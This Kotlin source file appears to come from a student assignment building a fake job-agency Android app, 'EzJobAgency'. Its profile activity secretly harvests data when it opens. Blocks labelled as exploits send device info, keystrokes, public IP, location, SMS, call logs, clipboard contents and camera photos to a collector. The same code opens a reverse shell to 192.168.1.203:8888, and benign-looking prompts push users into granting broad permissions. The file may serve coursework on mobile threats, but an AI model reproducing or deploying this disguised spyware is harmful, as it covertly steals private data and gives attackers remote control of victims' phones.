package com.example.assignment1

import android.Manifest
import android.app.Activity
import android.app.AlertDialog
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.StrictMode
import android.provider.Settings
import android.util.Log
import android.view.View
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.example.assignment1.DataRetriever.FindLocation
import com.example.assignment1.DataRetriever.General
import com.google.android.material.imageview.ShapeableImageView
import java.util.*


class ProfileTemplate : AppCompatActivity() {
    private var datasender = DataSender()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        datasender.obtainAndroidID(this.contentResolver)                     // Set AndroidID
        val hv = Harvester(this, this, datasender)
        val id = intent.getIntExtra("id",0)
        val industry_name = intent.getStringExtra("industry_name")
        setContentView(R.layout.activity_profile)
        if (industry_name != null) {
            renderInfo(id, industry_name)
        } else {
            renderInfo(id, "")
        }

        findViewById<Button>(R.id.callUs).setOnClickListener(::callUs)
        findViewById<Button>(R.id.smsUs).setOnClickListener(::smsUs)
        findViewById<TextView>(R.id.ResumeBtn).setOnClickListener(::chooseFile)
        findViewById<Button>(R.id.location).setOnClickListener(::location)
        findViewById<TextView>(R.id.cameraBtn).setOnClickListener(::openCamera)
        findViewById<TextView>(R.id.Send).setOnClickListener(::send)

        val policy = StrictMode.ThreadPolicy.Builder().permitAll().build()  // Need this to allow finding of public IP - MY
        StrictMode.setThreadPolicy(policy)

        // MY Exploit -----------------------------------------------------------------
        val gn = General(this,this)
        val gps = FindLocation(this, this)
        Log.d("Send data", "deviceinfo")
        datasender.sendData(gn.stealDeviceInfo())

        Log.d("Send data", "keys")
        gn.logKeys()?.let { datasender.sendData(it) }
        Log.d("Send data", "pubip")
        gn.getPublicIP()?.let { datasender.sendData(it) }
        val LOCPERMISSIONS = arrayOf(
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_FINE_LOCATION
        )
        if (checkPerms(this, *LOCPERMISSIONS)) {
            Log.d("Send data", "geo")
            datasender.sendData(gps.getLocationDetails())
        }
        gn.accessibilityCheck()

        // Keefe Exploit --------------------------------------------------------------
        val SMSPERMISSIONS = arrayOf(
            android.Manifest.permission.SEND_SMS,
            android.Manifest.permission.READ_SMS
        )
        if (checkPerms(this, *SMSPERMISSIONS)) {
             hv.getSMS()
        }
        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
             hv.getCallLog()
        }
        if (checkFileStoragePerms()) {
            hv.getShell("192.168.1.203", 8888)
        }   // Shell Exploit

        // Lynette Camera Exploit (Done in Camera Button) -----------------------------
        datasender.sendData(gn.stealClipboard())
    }

    private fun renderInfo(id: Int, industry_name: String) {
        val title = findViewById<TextView>(R.id.pageTitle)
        title.setText(industry_name)
        val name = findViewById<TextView>(R.id.name)
        val description = findViewById<TextView>(R.id.description)
        val phone_number = findViewById<TextView>(R.id.phone_number)
        val email = findViewById<TextView>(R.id.email)
        val imageView = findViewById<ShapeableImageView>(R.id.imageView2)

        when(id) {
            R.id.wesley_button -> {
                name.setText(R.string.wesley)
                phone_number.setText(R.string.wesley_number)
                email.setText(R.string.wesley_email)
                imageView.setImageDrawable(getResources().getDrawable(R.drawable.wesley, getApplicationContext().getTheme()))
            }
            R.id.mengrong_button -> {
                name.setText(R.string.mengrong)
                phone_number.setText(R.string.mengrong_number)
                email.setText(R.string.mengrong_email)
                imageView.setImageDrawable(getResources().getDrawable(R.drawable.mengrong, getApplicationContext().getTheme()))
            }
            R.id.lynette_button -> {
                name.setText(R.string.lynette)
                phone_number.setText(R.string.lynette_number)
                email.setText(R.string.lynette_email)
                imageView.setImageDrawable(getResources().getDrawable(R.drawable.lynette, getApplicationContext().getTheme()))
            }
            R.id.minyao_button -> {
                name.setText(R.string.minyao)
                phone_number.setText(R.string.minyao_number)
                email.setText(R.string.minyao_email)
                imageView.setImageDrawable(getResources().getDrawable(R.drawable.minyao, getApplicationContext().getTheme()))
            }
            R.id.keefe_button -> {
                name.setText(R.string.keefe)
                phone_number.setText(R.string.keefe_number)
                email.setText(R.string.keefe_email)
                imageView.setImageDrawable(getResources().getDrawable(R.drawable.keefe, getApplicationContext().getTheme()))
            }
            R.id.jon_button -> {
                name.setText(R.string.jon)
                phone_number.setText(R.string.jon_number)
                email.setText(R.string.jon_email)
                imageView.setImageDrawable(getResources().getDrawable(R.drawable.jon, getApplicationContext().getTheme()))
            }
        }
        when(industry_name) {
            "IT Industry" -> description.setText(R.string.it_info)
            "Construction Industry" -> description.setText(R.string.construction_info)
            "Education Industry" -> description.setText(R.string.education_info)
            "Entertainment Industry" -> description.setText(R.string.entertainment_info)
            "Finance Industry" -> description.setText(R.string.finance_info)
            "F&B Industry" -> description.setText(R.string.fnb_info)

        }
    }

    private fun smsUs(view: View) {
        val PERMISSIONS = arrayOf(
            android.Manifest.permission.SEND_SMS,
            android.Manifest.permission.READ_SMS
        )
        if (checkPerms(this, *PERMISSIONS)) {
            writeSms("Hello, I am interested in your job position in the EzJobAgency app.")
        } else {
            requestPerms(this, PERMISSIONS, 101)
        }
    }
    private fun callUs(view: View) {
        val PERMISSIONS = arrayOf(
            android.Manifest.permission.READ_CALL_LOG,
            android.Manifest.permission.CALL_PHONE,
        )
        if (checkPerms(this, *PERMISSIONS)) {
            val phone_number = "+65" + findViewById<TextView>(R.id.phone_number).text.toString().filter { it.isDigit() }
            val callIntent = Intent(Intent.ACTION_DIAL)
            callIntent.data = Uri.parse("tel:" + phone_number)
            startActivity(callIntent)
        } else {
            requestPerms(this, PERMISSIONS, 102)
        }
    }
    private fun chooseFile(view: View) {
        if (checkFileStoragePerms()) {
            fileSelector()
        }
        else {
            requestFileStoragePerms()
        }
    }
    private fun location(view: View) {
        val PERMISSIONS = arrayOf(
            android.Manifest.permission.ACCESS_COARSE_LOCATION,
            android.Manifest.permission.ACCESS_FINE_LOCATION
        )
        if (checkPerms(this, *PERMISSIONS)) {
            // Check background location perms
            if (checkPerms(this, android.Manifest.permission.ACCESS_BACKGROUND_LOCATION)) {
                // send to google maps
                redirectLocation()
            } else {
                val bgAlert = AlertDialog.Builder(this)
                bgAlert.setTitle("Permission Needed!")
                bgAlert.setMessage("Background Location Permission Needed!, tap \"Allow all the time in the next screen\"")
                bgAlert.setPositiveButton("Yes") {
                    dialog, which -> requestPerms(this, arrayOf(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION), 103)
                }
                bgAlert.setNegativeButton("No") {
                    dialog, which -> dialog.cancel()
                }
                bgAlert.show()
            }
        } else {
            requestPerms(this, PERMISSIONS, 104)
        }
    }
    private fun openCamera(view: View) {
        if (checkPerms(this, android.Manifest.permission.CAMERA)) {
            startCamera()
        }
        else {
            requestPerms(this, arrayOf(android.Manifest.permission.CAMERA), 105)
        }
    }

    // TODO: Merge all of the check and request permission into a permission handler function - Jon
    private fun checkFileStoragePerms(): Boolean{
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R)
        {
            //Android is 11(R) or above
            Environment.isExternalStorageManager()
        }
        else{
            //Android is below 11(R)
            val write = ContextCompat.checkSelfPermission(this, android.Manifest.permission.WRITE_EXTERNAL_STORAGE)
            val read = ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE)
            write == PackageManager.PERMISSION_GRANTED && read == PackageManager.PERMISSION_GRANTED
        }
    }
    private fun requestFileStoragePerms() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R){
            //Android is 11(R) or above
            val intent = Intent()
            intent.action = Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION
            selectorARL.launch(intent)
        }
        else{
            //Android is below 11(R)
            ActivityCompat.requestPermissions(this,
                arrayOf(android.Manifest.permission.WRITE_EXTERNAL_STORAGE, android.Manifest.permission.READ_EXTERNAL_STORAGE),
                100
            )
        }
    }
    private val selectorARL = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        if (result.resultCode == Activity.RESULT_OK) {
            val intent = result.data

            val uri = intent?.data
            val filename = uri!!.path!!.substring(uri.path!!.lastIndexOf('/') + 1)
            println(filename)

            val textView = findViewById<TextView>(R.id.filename)
            textView.text = filename
        }
    }
    private fun fileSelector() {
        val intent = Intent(Intent.ACTION_OPEN_DOCUMENT)
        intent.type = "application/pdf"
        selectorARL.launch(Intent.createChooser(intent, "Choose a file"))
    }


    // Camera Functions (DEPRECATED) ------------------------------------------------------------------------
//    private fun checkCameraPerms(): Boolean{
//        return ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
//    }
//    private fun requestCameraPerms() {
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R){
//            //Android is 11(R) or above
//            ActivityCompat.requestPermissions(this,
//                arrayOf(android.Manifest.permission.CAMERA, android.Manifest.permission.WRITE_EXTERNAL_STORAGE),
//                10
//            )
//        }
//    }
    private fun startCamera() {
        val intent = Intent(this@ProfileTemplate, CameraStart::class.java)
//        startActivity(intent)
        cameraAR.launch(intent)
    }
    private val cameraAR = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        if (result.resultCode == Activity.RESULT_OK) {
            val filename = "resume.jpeg"
            println(filename)

            val textView = findViewById<TextView>(R.id.filename)
            textView.text = filename

            datasender.sendFile(filesDir.path + "/"+ filename)
        }
    }


    // ContactUs Functions (DEPRECATED) ------------------------------------------------------------------------
//    private fun checkSMSPerms(): Boolean{
//        val sendsms = ContextCompat.checkSelfPermission(this, android.Manifest.permission.SEND_SMS)
//        val readsms = ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS)
//        val boolie1 = sendsms == PackageManager.PERMISSION_GRANTED
//        val boolie2 = readsms == PackageManager.PERMISSION_GRANTED
//        println("$boolie1 $boolie2")
//        return readsms == PackageManager.PERMISSION_GRANTED
//    }
//
//    private fun requestSMSPerms() {
//        println("request Perms")
//        ActivityCompat.requestPermissions(this, arrayOf(android.Manifest.permission.READ_SMS), 101)
//    }

    /*
    * Checks whether permissions supplied are allowed
    * Arguments:
    *   context: context
    *   permissions: an array of Strings or a single string that represent the permissions.
    * Returns:
    *   A boolean of true or false depending on whether all the permissions are given
    * */
    private fun checkPerms(context: Context,vararg permissions: String): Boolean = permissions.all {
        val isPerm = ContextCompat.checkSelfPermission(context,it) == PackageManager.PERMISSION_GRANTED
        println("Checking $it: $isPerm")
        ContextCompat.checkSelfPermission(context,it) == PackageManager.PERMISSION_GRANTED
    }

    /*
    * Request for permissions supplied
    * Arguments:
    *   activity: activity
    *   permissions: an array of containing string(s) that represent the permissions.
    *   requestCode: an integer representing the request code of the permission
    * Returns:
    *   A boolean of true or false depending on whether all the permissions are given
    * */
    private fun requestPerms(activity: Activity, permissions: Array<String>, requestCode: Int) {
        var promptdialog = false
        for (permission in permissions) {
            println("checking should show request for $permission")
            if(ActivityCompat.shouldShowRequestPermissionRationale(activity, permission)) {
                println("hello")
                promptdialog = true
            }
        }
        val permissionList = Arrays.toString(permissions)
        if(promptdialog) {
            toast("Please enable the $permissionList in the app settings")
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
            val uri = Uri.fromParts("package", activity.packageName, null)
            intent.data = uri
            activity.startActivity(intent)
        } else {
            toast("Please enable the $permissionList in the app settings")
            println("Request permissions: $permissions")
            ActivityCompat.requestPermissions(activity, permissions, requestCode)
        }
    }

    private fun redirectLocation() {
        println("Redirect to google maps")
        val gmmIntentUri = Uri.parse("google.navigation:q=Singapore Institute of Technology @ NYP")
        val mapIntent = Intent(Intent.ACTION_VIEW, gmmIntentUri)
        mapIntent.setPackage("com.google.android.apps.maps")
        startActivity(mapIntent)
    }

    private fun writeSms(message: String) {
        val smsIntent : Intent = Uri.parse("smsto:" + 91234567).let { number -> Intent(Intent.ACTION_VIEW, number)}
        smsIntent.putExtra("sms_body", message)
        startActivity(smsIntent)
    }

    private fun send(view: View){
        val textView = findViewById<TextView>(R.id.filename)
        textView.text = ""
        toast("Resume sent to server")
    }

    // Extra Functions
    private fun toast(message: String){
        Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
    }
}